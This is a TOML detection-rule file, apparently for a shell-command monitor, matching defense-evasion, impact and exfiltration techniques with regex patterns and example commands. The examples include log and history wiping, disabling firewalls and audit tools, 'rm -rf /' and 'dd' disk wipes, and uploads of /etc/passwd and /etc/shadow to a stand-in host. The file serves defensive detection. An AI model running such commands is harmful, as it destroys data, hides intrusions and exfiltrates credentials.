# ------------------------------------------------------------ Defense evasion

[[rule]]
id = "evasion-clear-history"
technique = "T1070.003"
confidence = "high"
scope = "command"
description = "Erasing shell history"
pattern = '''(\bhistory\s+-[cw]\b|>\s*\S*\.(bash_|zsh_)?history\b|\brm\s+(-\S+\s+)*\S*\.(bash_|zsh_)?history\b|\bln\s+-s\w*\s+/dev/null\s+\S*history)'''
examples = ["history -c", "cat /dev/null > ~/.bash_history", "rm -f ~/.bash_history", "ln -sf /dev/null ~/.bash_history"]
not_examples = ["history", "cat ~/.bash_history"]

[[rule]]
id = "evasion-prevent-history"
technique = "T1690"
confidence = "high"
scope = "command"
description = "Stopping the shell from recording commands"
pattern = '''(\bunset\s+HISTFILE\b|\bHISTFILE=(/dev/null)?(\s|;|$)|\bHISTSIZE=0\b|\bHISTFILESIZE=0\b|\bset\s+\+o\s+history\b)'''
examples = ["unset HISTFILE", "export HISTSIZE=0", "set +o history", "HISTFILE=/dev/null"]
not_examples = ["history"]

[[rule]]
id = "evasion-clear-logs"
technique = "T1685.006"
confidence = "high"
scope = "command"
description = "Deleting or truncating system logs"
pattern = '''((\brm\b|\btruncate\b|\bshred\b|>)\s*[^|;&<>]*?/var/log/\S*|\b(rm|truncate|shred)\b.*\b(wtmp|btmp|lastlog|utmp)\b|\bjournalctl\s+--(vacuum|rotate)|\blogrotate\s+-f)'''
examples = ["rm -rf /var/log/*", "> /var/log/auth.log", "truncate -s 0 /var/log/syslog", "rm /var/log/wtmp", "journalctl --vacuum-time=1s"]
not_examples = ["cat /var/log/auth.log", "tail -f /var/log/syslog"]

[[rule]]
id = "evasion-delete-files"
technique = "T1070.004"
confidence = "medium"
description = "Deleting files, usually to remove the dropper after running it"
pattern = '''^(rm|unlink)(\s|$)'''
examples = ["rm a.sh", "rm -rf /tmp/x", "unlink /tmp/x"]
not_examples = ["rmdir", "rmmod x"]

[[rule]]
id = "evasion-timestomp"
technique = "T1070.006"
confidence = "high"
description = "Altering file timestamps"
pattern = '''^touch\s+(.*\s)?(-[admrt]+\b|--(date|reference)\b)'''
examples = ["touch -r /bin/ls x", "touch -d '2020-01-01' x", "touch -t 202001010000 x"]
not_examples = ["touch x"]

[[rule]]
id = "evasion-hidden-staging"
technique = "T1564.001"
confidence = "medium"
scope = "command"
description = "Using a hidden file or directory in a world-writable location"
pattern = '''(/tmp|/var/tmp|/dev/shm)/\.[A-Za-z0-9_]'''
examples = ["mkdir /tmp/.x", "cd /dev/shm/.hidden", "wget -O /var/tmp/.a http://x/a"]
not_examples = ["cd /tmp", "ls /tmp/x"]

[[rule]]
id = "defense-impair-firewall"
technique = "T1686"
confidence = "high"
description = "Flushing or disabling the host firewall"
pattern = '''^((iptables|ip6tables)\s+.*(-F\b|--flush|-X\b|-P\s+\w+\s+ACCEPT)|nft\s+flush|ufw\s+(disable|reset)|(systemctl|service)\s+(stop|disable)\s+(firewalld|ufw|iptables|nftables)|service\s+(firewalld|ufw|iptables)\s+stop)'''
examples = ["iptables -F", "iptables -P INPUT ACCEPT", "ufw disable", "systemctl stop firewalld", "service iptables stop"]
not_examples = ["iptables -L", "ufw status"]

[[rule]]
id = "defense-impair-tools"
technique = "T1685"
confidence = "high"
description = "Switching off security tooling"
pattern = '''^(setenforce\s+0|(systemctl|service)\s+(stop|disable)\s+(auditd|apparmor|rsyslog|syslog|wazuh-agent|ossec|falcon-sensor|clamav\S*|aegis|aliyun\S*|sentinelone|osqueryd)|service\s+(auditd|apparmor|rsyslog)\s+stop|(pkill|killall)\s+.*(auditd|rsyslog|wazuh|ossec|aegis|aliyun|barad|yunjing))'''
examples = ["setenforce 0", "systemctl stop auditd", "service rsyslog stop", "pkill -9 aliyun"]
not_examples = ["getenforce", "systemctl status auditd"]

[[rule]]
id = "defense-impair-audit"
technique = "T1685.004"
confidence = "high"
description = "Disabling or clearing the Linux audit rules"
pattern = '''^auditctl\s+(-e\s*0|-D)\b'''
examples = ["auditctl -e 0", "auditctl -D"]
not_examples = ["auditctl -l"]

# -------------------------------------------------------- Impact / collection

[[rule]]
id = "impact-service-stop"
technique = "T1489"
confidence = "medium"
description = "Stopping a service"
pattern = '''^(systemctl|service)\s+(stop|disable|kill)\s|^service\s+\S+\s+stop\b'''
examples = ["systemctl stop nginx", "service apache2 stop"]
not_examples = ["systemctl start nginx"]

[[rule]]
id = "impact-shutdown"
technique = "T1529"
confidence = "high"
description = "Shutting down or rebooting the host"
pattern = '''^(reboot|shutdown|halt|poweroff|init\s+[06])(\s|$)|^systemctl\s+(reboot|poweroff|halt)\b'''
examples = ["reboot", "shutdown -h now", "init 0", "systemctl poweroff"]
not_examples = ["shutdownx"]

[[rule]]
id = "impact-destroy-data"
technique = "T1485"
confidence = "high"
scope = "command"
description = "Destroying data or disks"
pattern = '''(\brm\s+(-\S+\s+)+(--no-preserve-root\s+)?/\*?(\s|$)|--no-preserve-root|\bdd\s+if=/dev/(zero|urandom|random)\s+of=/dev/(sd|vd|nvme|xvd)|\bmkfs(\.\w+)?\s+/dev/|\bwipefs\b)'''
examples = ["rm -rf /", "rm -rf /*", "dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sda1"]
not_examples = ["rm -rf /tmp/x", "rm a.sh"]

[[rule]]
id = "impact-account-removal"
technique = "T1531"
confidence = "medium"
description = "Deleting or locking accounts"
pattern = '''^(userdel|deluser)(\s|$)|^usermod\s+.*-L\b|^passwd\s+(-l|-d)\b'''
examples = ["userdel admin", "passwd -l admin", "usermod -L bob"]
not_examples = ["useradd bob"]

[[rule]]
id = "collection-archive"
technique = "T1560.001"
confidence = "medium"
description = "Compressing files with an archive utility"
pattern = '''^(tar\s+(-?\w*c\w*|--create)\b|zip\s|7z\s+a\b|7za\s+a\b|rar\s+a\b)'''
examples = ["tar czf out.tgz /etc", "tar -cvf x.tar dir", "zip -r x.zip dir", "7z a x.7z dir"]
not_examples = ["tar xzf a.tgz", "tar -xvf a.tar"]

[[rule]]
id = "exfil-upload"
technique = "T1048"
confidence = "medium"
description = "Uploading local data to a remote server"
pattern = '''^curl\s+(.*\s)?(-T\b|--upload-file|(-F|--form)\s+\S*@|--data-binary\s+@|-d\s+@)|^ftpput(\s|$)'''
examples = ["curl -T /etc/passwd http://x/u", "curl -F file=@/etc/shadow http://x", "curl --data-binary @data http://x"]
not_examples = ["curl http://x/a.sh"]
